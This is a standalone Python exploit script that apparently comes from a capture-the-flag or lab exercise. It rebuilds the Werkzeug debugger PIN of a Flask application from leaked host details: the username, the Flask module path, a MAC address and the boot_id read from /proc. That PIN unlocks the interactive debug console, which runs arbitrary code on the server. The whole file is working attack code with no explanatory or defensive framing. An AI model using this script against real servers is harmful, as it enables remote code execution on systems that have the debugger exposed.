#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
	'webuser',# from whoami
	'flask.app',
	'Flask',
	'/usr/local/lib/python3.11/site-packages/flask/app.py' # from ls
]

private_bits = [
	'138686757136594',# mac address as int, from 
	'7f02bfec-f327-4896-8695-dd8e7f8936c7' # machine id: just /proc/sys/kernel/random/boot_id from other docker (they share it), the others are empty
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print("Pin: " + rv)